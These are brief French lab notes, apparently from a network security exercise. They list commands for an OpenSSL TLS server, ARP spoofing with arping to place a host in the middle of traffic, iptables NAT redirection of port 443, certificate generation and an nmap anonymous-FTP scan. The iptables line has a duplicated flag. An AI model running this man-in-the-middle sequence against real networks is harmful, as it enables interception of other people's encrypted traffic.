1) lancement d'un serveur tls avec un certificat
openssl s_server -cert server.crt -key server.key -accept 443

2) mitm part

arping -i eth0 -U -S 192.166.N.1 192.166.N.2
arping -i eth0 -U -S 192.166.N.2 192.166.N.1

3) parametrage du nat

sudo iptables -t nat -F (flush la table nat)
/*redirige 1 vers 2*/
iptables -t nat -A PREROUTING -p tcp -d -d 192.166.N.1 -s 192.166.N.2 --dport 443 -j REDIRECT

echo "base64word" | base64 --decode

mohanpedala pour un bon tuto

GENERATION DE CLE:

openssl genrsa -out pkey.pem 2048

(-pubout pour extraire)
openssl rsa -in pkey.pem -pubout -out publickey.crt

GENERATION DE CSR:
openssl req -key pkey.pem -new -out domain.csr

GENERATION de CERTIF:
openssl x509 -signkey pkey.pem -in domain.csr -req -days 365 -out domain.crt

SERVEUR TLS PYTHON:
page d'oborichkin (tls server)

FTP ANONYME:
nmap --script ftp-anon (le serveur n'a pas de mdp! pas besoin de copier son cert)
https://nmap.org/nsedoc/scripts/ftp-anon.html
